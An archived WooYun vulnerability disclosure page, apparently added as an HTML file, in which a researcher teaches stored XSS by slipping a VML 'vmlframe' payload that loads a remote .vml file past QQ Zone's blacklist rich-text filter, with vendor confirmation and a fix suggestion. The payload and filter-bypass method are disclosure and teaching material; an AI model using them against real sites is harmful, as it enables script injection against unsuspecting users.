@@ -1,0 +1,279 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 20. 存储型XSS入门 [套现绕过富文本]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 20. 存储型XSS入门 [套现绕过富文本]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2013-01-01 09:05</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-24：	细节向普通白帽子公开<br/>
+									2013-02-03：	细节向实习白帽子公开<br/>
+									2013-02-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">很多应用含有富文本内容，这类应用最典型的特征是具有编辑器，例如：博客日志，邮箱等。这类应用往往允许使用一定的HTML代码。为了在用户体验和安全之间寻找平衡，各种厂商可能采用了不尽相同的办法。但是总体来说，有2类。<br />
+<br />
+第1类我们称为白名单，即：只允许使用白名单内的合法HTML标签，例如IMG。其它均剔除。例如：百度贴吧回帖时候的代码过滤方式。<br />
+第2类我们称为黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分。 如：QQ邮箱的发邮件时的过滤方式。<br />
+<br />
+白名单要安全得多，而黑名单的方式则经常会被绕过。<br />
+<br />
+绕过的技巧也有很多，我们可以从最没技术含量的开始说起!! 本节将以QQ空间/QQ校友的日志功能为例来说明，什么是“套现绕过富文本”！<br />
+<br />
+注意：本节说的“套现”，不是与“钱”有关的；在这里的含义是：“套用现成的XSS代码”。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 新手平时测试XSS时，经常会用到&lt;script&gt;alert(1)&lt;/script&gt;到处插入，看效果。<br />
+<br />
+<br />
+<br />
+2. 这种做法，在某些反射型XSS，或者你运气好的时候，确实能碰到。但是如果拿到QQ空间日志里去插入。嗯，后果一定会很悲壮，被过滤的毛都没有了。。<br />
+<br />
+<br />
+<br />
+3. 这是为什么呢？因为&lt;script&gt;在腾讯的黑名单中，被过滤是理所当然的。<br />
+<br />
+<br />
+<br />
+4. 试想，如果我们找到一个不在腾讯黑名单中的XSS代码，岂不是就可以成功在日志里执行XSS了么？<br />
+<br />
+<br />
+<br />
+5. 有的人会问了。。哪里去找啊?? 方法有2种：<br />
+<br />
+<br />
+<br />
+5.1 你足够牛，自己去发现。<br />
+<br />
+5.2 已经有大牛为我们准备了很好的资料，去里面翻。<br />
+<br />
+<br />
+<br />
+6. 我不够牛，所以我只能去大牛的资料里翻咯。<br />
+<br />
+<br />
+<br />
+这里我翻的是 @sogili 维护的 http://html5sec.org/ ，里面有很多哦<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0103185879234a8dec09bef87c02fc631350ec3b.jpg" target="_blank"><img src="../images/0103185879234a8dec09bef87c02fc631350ec3b.jpg" alt="100.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 然后我就开始按照下面的流程慢慢测试。<br />
+<br />
+<br />
+<br />
+先进QQ空间，发表一个日志，然后编辑日志，同时抓包。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0103190902230dbc969bd936ff1809ae8bf902f9.jpg" target="_blank"><img src="../images/0103190902230dbc969bd936ff1809ae8bf902f9.jpg" alt="99.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+修改抓包内容后，这里修改的是日志内容。提交修改后的数据包！<br />
+<br />
+<br />
+<br />
+然后我们来看看日志里的源代码里，我们提交的XSS代码是否被过滤。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010319380cf8dda3f73501e859b72abcf0fda075.jpg" target="_blank"><img src="../images/010319380cf8dda3f73501e859b72abcf0fda075.jpg" alt="101.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 这里我们就不说失败的了，直接说成功的部分。<br />
+<br />
+<br />
+<br />
+我们提交以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;vmlframe xmlns=&quot;urn:schemas-microsoft-com:vml&quot; style=&quot;behavior:url(#default#vml);position:absolute;width:100%;height:100%&quot; src=&quot;http://itsokla.duapp.com/shouzi.vml#xss&quot;&gt;&lt;/vmlframe&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后看看源代码的输出：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0103195196d0072e0bdf88ab8d45dfb13ccb5492.jpg" target="_blank"><img src="../images/0103195196d0072e0bdf88ab8d45dfb13ccb5492.jpg" alt="102.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，这个XSS代码完全没过滤。<br />
+<br />
+<br />
+<br />
+9. 我们可以看到XSS的效果。鼠标移到日志上，即会触发XSS代码。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01032001e5f8adbb70864f7cc221444d44840ff2.jpg" target="_blank"><img src="../images/01032001e5f8adbb70864f7cc221444d44840ff2.jpg" alt="110.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+10. 很简单，对吧？ 但是有以下问题我们要注意！！<br />
+<br />
+<br />
+<br />
+10.1 使用代码前，先自己在本地试下，是否能执行！搞清楚你所使用的XSS代码的原理是什么！<br />
+<br />
+<br />
+<br />
+10.2 搞清楚XSS代码的适用范围：如：在什么浏览器的什么版本之下才能使用，是否需要用户交互等。<br />
+<br />
+<br />
+<br />
+10.3 注意平时对此类代码的搜集与整理。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明！ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 behavior, 和你们修复邮箱里相同问题的方法一样即可。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016779" title="[腾讯实例教程] 那些年我们一起学XSS - 20. 存储型XSS入门 [套现绕过富文本]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-01-04 17:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16779";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
